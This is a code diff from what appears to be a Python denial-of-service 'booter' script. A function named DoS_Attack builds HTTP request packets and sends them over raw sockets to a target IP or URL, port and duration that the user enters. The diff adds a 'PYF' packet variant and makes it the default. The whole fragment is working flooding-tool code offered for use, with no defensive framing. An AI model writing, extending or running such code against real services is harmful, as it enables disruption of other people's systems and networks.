@@ -47,7 +47,7 @@ def DoS_Attack(ip,host,port,type_attack,id,booter_sent,data_type_loader_packet):
         url_path = generate_url_path_choice(5)
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     try:
-        if data_type_loader_packet == 'PY':
+        if data_type_loader_packet == 'PY' or data_type_loader_packet == 'PYF':
             packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n".encode()
         elif data_type_loader_packet == 'OWN1':
             packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\r\r".encode()
@@ -102,7 +102,7 @@ print(banner)
 host = ""
 ip = ""
 print(f"{Fore.LIGHTWHITE_EX}PYF OWN1 OWN2")
-data_type_loader_packet = input(F"{Fore.WHITE}TYPE PACKET (DEFAULT=PY)>").upper()
+data_type_loader_packet = input(F"{Fore.WHITE}TYPE PACKET (DEFAULT=PYF)>").upper()
 target_loader = input(f"{Fore.LIGHTYELLOW_EX}IP/URL>")
 port_loader = int(input(f"{Fore.YELLOW}PORT>"))
 time_loader = time.time() + int(input(f"{Fore.LIGHTRED_EX}TIME (DEFAULT=250)>"))
